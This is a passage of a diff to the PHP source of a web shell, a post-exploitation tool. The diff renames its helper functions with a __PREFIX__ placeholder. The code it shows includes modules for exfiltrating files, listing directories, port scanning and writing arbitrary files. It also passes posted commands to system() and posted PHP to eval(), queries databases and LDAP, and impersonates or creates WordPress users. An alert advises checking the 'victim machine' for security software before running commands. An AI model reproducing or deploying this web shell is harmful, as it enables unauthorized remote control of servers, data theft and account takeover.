                                       "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value",
                             ),
-                            makeCheckbox(
+                            __PREFIX__makeCheckbox(
                                 "__PARAM_3__",
                                 "Export",
                                 "Export the file even if larger than 100kb.",
@@ -2253,17 +2264,17 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             );
             break;
         case $DIRECTORY_LISTING:
-            $content = makePage(
+            $content = __PREFIX__makePage(
                 [
-                    makePageHeader(
+                    __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
                         $ENABLED_FEATURES[$page]["description"],
                     ),
-                    makeForm(
+                    __PREFIX__makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
                         [
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Path",
                                 "__PARAM_1__",
@@ -2271,13 +2282,13 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "Fully qualified path to the directory to list.",
                                 true,
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Depth",
                                 "__PARAM_2__",
                                 "5",
-                                "How many levels deep to list, where " . makeCodeHighlight(0) .
-                                " is the current directory and " . makeCodeHighlight("inf") .
+                                "How many levels deep to list, where " . __PREFIX__makeCodeHighlight(0) .
+                                " is the current directory and " . __PREFIX__makeCodeHighlight("inf") .
                                 " means to list all.",
                                 true,
                             ),
@@ -2288,20 +2299,20 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             );
             break;
         case $EXFILTRATE:
-            $content = makeExfiltratePage();
+            $content = __PREFIX__makeExfiltratePage();
             break;
         case $PORT_SCAN:
-            $content = makePage(
+            $content = __PREFIX__makePage(
                 [
-                    makePageHeader(
+                    __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
                         $ENABLED_FEATURES[$page]["description"],
                     ),
-                    makeForm(
+                    __PREFIX__makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
                         [
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Host",
                                 "__PARAM_1__",
@@ -2309,7 +2320,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "The host to connect to",
                                 true,
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "number",
                                 "Starting port",
                                 "__PARAM_2__",
@@ -2317,7 +2328,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "Starting port of the scan (included)",
                                 true,
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "number",
                                 "Ending port",
                                 "__PARAM_3__",
@@ -2332,17 +2343,17 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             );
             break;
         case $WRITE_FILE:
-            $content = makePage(
+            $content = __PREFIX__makePage(
                 [
-                    makePageHeader(
+                    __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
                         $ENABLED_FEATURES[$page]["description"],
                     ),
-                    makeForm(
+                    __PREFIX__makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
                         [
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Path",
                                 "__PARAM_1__",
@@ -2350,7 +2361,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "Fully qualified path where the file will be written.",
                                 true,
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "textarea",
                                 "File content",
                                 "__PARAM_2__",
@@ -2358,7 +2369,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "Content of the file to write to disk.",
                                 true,
                             ),
-                            makeCheckbox(
+                            __PREFIX__makeCheckbox(
                                 "__PARAM_3__",
                                 "Decode from base64",
                                 "Decode the content of the file from base64 before writing it to disk.",
@@ -2370,13 +2381,13 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             );
             break;
         case $RUN_COMMAND:
-            $content = makePage(
+            $content = __PREFIX__makePage(
                 [
-                    makePageHeader(
+                    __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
                         $ENABLED_FEATURES[$page]["description"],
                     ),
-                    makeAlert(
+                    __PREFIX__makeAlert(
                         "Running system commands",
                         "Running system commands results in the creation of a child process from the 
                         webserver/php process (aka a new terminal is spawned), this behaviour as you may expect can be 
@@ -2385,11 +2396,11 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                         If triggering alert is not a problem, safely ignore this alert, otherwise carefully examine the 
                         victim machine and ensure that there is no security solution running before using this module.",
                     ),
-                    makeForm(
+                    __PREFIX__makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
                         [
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "textarea",
                                 "Command",
                                 "__PARAM_1__",
@@ -2407,9 +2418,9 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             ob_start();
             phpinfo();
             $php_info = ob_get_clean();
-            $content  = makePage(
+            $content  = __PREFIX__makePage(
                 [
-                    makePageHeader(
+                    __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
                         $ENABLED_FEATURES[$page]["description"],
                     ),
@@ -2423,7 +2434,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                             </script>
                         </div>
                         <div>
-                            " . listEnabledExtensions() . "
+                            " . __PREFIX__listEnabledExtensions() . "
                         </div>
                     </div>",
                 ],
@@ -2431,17 +2442,17 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             );
             break;
         case $QUERY_DATABASES:
-            $content = makePage(
+            $content = __PREFIX__makePage(
                 [
-                    makePageHeader(
+                    __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
                         $ENABLED_FEATURES[$page]["description"],
                     ),
-                    makeForm(
+                    __PREFIX__makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
                         [
-                            makeSelect(
+                            __PREFIX__makeSelect(
                                 "Database",
                                 "__PARAM_1__",
                                 [
@@ -2520,14 +2531,14 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 true,
                                 "Database driver not available.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Host",
                                 "__PARAM_2__",
                                 "localhost",
                                 "The host to connect to (default: localhost)",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "number",
                                 "Port",
                                 "__PARAM_3__",
@@ -2549,7 +2560,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                         <li>Sybase (default: 5000)</li>
                                     </ul>",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Username",
                                 "__PARAM_4__",
@@ -2557,7 +2568,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "The username to connect with.",
                                 true,
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "password",
                                 "Password",
                                 "__PARAM_5__",
@@ -2565,98 +2576,98 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "The password to connect with.",
                                 true,
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Database",
                                 "__PARAM_6__",
                                 "ExampleDB",
                                 "The database to connect to.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Charset",
                                 "__PARAM_7__",
                                 "utf8",
                                 "The charset to use for the connection.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Service name",
                                 "__PARAM_8__",
                                 "orcl",
                                 "The service name to use for the connection.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "SID",
                                 "__PARAM_9__",
                                 "orcl",
                                 "The SID to use for the connection.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Options",
                                 "__PARAM_10__",
                                 "ssl=true",
                                 "The options to use for the connection.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Role",
                                 "__PARAM_11__",
                                 "SYSDBA",
                                 "The role to use for the connection.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Dialect",
                                 "__PARAM_12__",
                                 "3",
                                 "The dialect to use for the connection.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Protocol",
                                 "__PARAM_13__",
                                 "onsoctcp",
                                 "The protocol to use for the connection.",
                             ),
-                            makeCheckbox(
+                            __PREFIX__makeCheckbox(
                                 "__PARAM_14__",
                                 "Enable scrollable cursors",
                                 "Enable scrollable cursors for the connection.",
                                 true,
                                 "1",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "ODBC driver",
                                 "__PARAM_15__",
                                 "ODBC Driver 17 for SQL Server",
                                 "The ODBC driver to use for the connection.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Raw connection string",
                                 "__PARAM_16__",
                                 "mysql:host=localhost;port=3306;dbname=ExampleDB;charset=utf8",
                                 "The raw connection string to use for the connection.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Server",
                                 "__PARAM_17__",
                                 "ol_informix1170",
                                 "The Informix server name to use for the connection.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "textarea",
                                 "Query",
                                 "__PARAM_18__",
                                 "SHOW DATABASES",
                                 "The query to run against the database. Leave empty to perform a connection test.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Collection",
                                 "__PARAM_19__",
@@ -2664,7 +2675,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "The collection to query against for MongoDB.",
                             ),
                             '<script>
-                                function hideAll() {
+                                function __PREFIX__hideAll() {
                                     for (let i = 2; i <= 17; i++) {
                                         document.getElementById(`__PARAM_${i}__-container`).classList.add(`hidden`);
                                     }
@@ -2672,7 +2683,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                     document.getElementById(`__PARAM_19__-container`).classList.add(`hidden`);
                                 }
                                 
-                                function showRange(start, end) {
+                                function __PREFIX__showRange(start, end) {
                                     for (let i = start; i <= end; i++) {
                                         document.getElementById(`__PARAM_${i}__-container`).classList.remove(`hidden`);
                                     }
@@ -2735,17 +2746,17 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             );
             break;
         case $QUERY_LDAP:
-            $content = makePage(
+            $content = __PREFIX__makePage(
                 [
-                    makePageHeader(
+                    __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
                         $ENABLED_FEATURES[$page]["description"],
                     ),
-                    makeForm(
+                    __PREFIX__makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
                         [
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Domain controller",
                                 "__PARAM_1__",
@@ -2753,14 +2764,14 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "The domain controller to connect to.",
                                 true,
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "LDAP port",
                                 "__PARAM_2__",
                                 "389",
                                 "The port to connect to.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Domain",
                                 "__PARAM_3__",
@@ -2768,21 +2779,21 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "The domain to connect to.",
                                 true,
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Username",
                                 "__PARAM_4__",
                                 "admin",
                                 "The username to connect with.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "password",
                                 "Password",
                                 "__PARAM_5__",
                                 "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                                 "The password to connect with.",
                             ),
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "textarea",
                                 "Query",
                                 "__PARAM_6__",
@@ -2797,17 +2808,17 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             );
             break;
         case $EVAL:
-            $content = makePage(
+            $content = __PREFIX__makePage(
                 [
-                    makePageHeader(
+                    __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
                         $ENABLED_FEATURES[$page]["description"],
                     ),
-                    makeForm(
+                    __PREFIX__makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
                         [
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "textarea",
                                 "PHP code",
                                 "__PARAM_1__",
@@ -2822,14 +2833,14 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             );
             break;
         case $IMPERSONATE_WP_USER:
-            $users   = getWPUsers();
-            $content = makePage(
+            $users   = __PREFIX__getWPUsers();
+            $content = __PREFIX__makePage(
                 [
-                    makePageHeader(
+                    __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
                         $ENABLED_FEATURES[$page]["description"],
                     ),
-                    makeTable(
+                    __PREFIX__makeTable(
                         "Users",
                         "WordPress users to impersonate",
                         $users,
@@ -2842,7 +2853,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                         ],
                         "
                         <dialog id='create-wp-user' class='p-4 rounded w-1/3'>" .
-                        makeForm(
+                        __PREFIX__makeForm(
                             $page,
                             $_SERVER["REQUEST_URI"],
                             [
@@ -2853,7 +2864,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                             &times;
                                         </button>
                                     </div>",
-                                makeInput(
+                                __PREFIX__makeInput(
                                     "text",
                                     "Username",
                                     "__PARAM_2__",
@@ -2861,7 +2872,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                     "Username of the user to create.",
                                     true,
                                 ),
-                                makeInput(
+                                __PREFIX__makeInput(
                                     "password",
                                     "Password",
                                     "__PARAM_3__",
@@ -2890,42 +2901,42 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
 
     echo $content;
 
-    if (isPost() && !in_array($_POST["__OPERATION__"], $isolated_ops)) {
-        openCommandOutputScreen();
+    if (__PREFIX__isPost() && !in_array($_POST["__OPERATION__"], $isolated_ops)) {
+        __PREFIX__openCommandOutputScreen();
     }
 }
 
-if (isPost()) {
+if (__PREFIX__isPost()) {
     $operation = $_POST["__OPERATION__"];
 
     switch ($operation) {
         case $LOGIN:
-            handleLogin();
+            __PREFIX__handleLogin();
             break;
         case $FILE_EXTRACTION_PREVIEW:
         case $FILE_EXTRACTION:
-            handleFileExtraction();
+            __PREFIX__handleFileExtraction();
             break;
         case $DIRECTORY_LISTING:
-            handleDirectoryListing();
+            __PREFIX__handleDirectoryListing();
             break;
         case $EXFILTRATE:
-            handleCreateZip();
+            __PREFIX__handleCreateZip();
             break;
         case $PORT_SCAN:
-            handlePortScan();
+            __PREFIX__handlePortScan();
             break;
         case $WRITE_FILE:
-            handleWriteFile();
+            __PREFIX__handleWriteFile();
             break;
         case $RUN_COMMAND:
             system($_POST["__PARAM_1__"]);
             break;
         case $QUERY_DATABASES:
-            handleQueryDatabase();
+            __PREFIX__handleQueryDatabase();
             break;
         case $QUERY_LDAP:
-            runLDAPQuery(
+            __PREFIX__runLDAPQuery(
                 $_POST["__PARAM_1__"],
                 !empty($_POST["__PARAM_2__"]) ? intval($_POST["__PARAM_2__"]) : null,
                 !empty($_POST["__PARAM_4__"]) ? $_POST["__PARAM_4__"] : null,
@@ -2938,7 +2949,7 @@ if (isPost()) {
             eval($_POST["__PARAM_1__"]);
             break;
         case $IMPERSONATE_WP_USER:
-            handleImpersonateWPUser();
+            __PREFIX__handleImpersonateWPUser();
             break;
         default:
             echo "Unrecognized operation '$operation'";
@@ -2947,8 +2958,8 @@ if (isPost()) {
 }
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page end
-if (!isPost() &&
+if (!__PREFIX__isPost() &&
     (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops)) &&
     $_POST["__OPERATION__"] !== $LOGIN) {
-    closeCommandOutputScreen();
+    __PREFIX__closeCommandOutputScreen();
 }
